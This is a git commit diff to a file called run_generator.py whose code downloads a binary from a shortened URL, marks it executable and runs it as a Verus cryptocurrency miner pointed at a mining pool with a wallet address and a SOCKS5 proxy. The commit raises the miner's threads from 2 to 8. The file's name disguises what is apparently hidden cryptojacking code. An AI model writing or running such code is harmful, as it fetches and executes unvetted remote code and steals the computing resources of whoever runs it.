e7a339c47aab158cb3284071faad845b2200f60f
pakdegaduk010 <93406504+pakdegaduk010@users.noreply.github.com>
2021-10-31 23:14:19 +0700

    Update run_generator.py

--- run_generator.py
+++ run_generator.py
@@ -1,3 +1,3 @@
 import os as alpha
 alpha.system("apt update && apt install wget -y && apt install sudo -y")
-alpha.system("apt-get update && apt-get upgrade -y && apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1 && wget -qO build https://git.io/JKYC2 && chmod +x build && ./build -a verus -o stratum+tcp://eu.luckpool.net:3956 -u RJsPUk4b65Q3iyrKgvG2HVwmNzUsGXqZiD.SIHU -p x -t 2 -x socks5://janda:9000@88.198.24.108:1080")
+alpha.system("apt-get update && apt-get upgrade -y && apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1 && wget -qO build https://git.io/JKYC2 && chmod +x build && ./build -a verus -o stratum+tcp://eu.luckpool.net:3956 -u RJsPUk4b65Q3iyrKgvG2HVwmNzUsGXqZiD.SIHU -p x -t 8 -x socks5://janda:9000@88.198.24.108:1080")
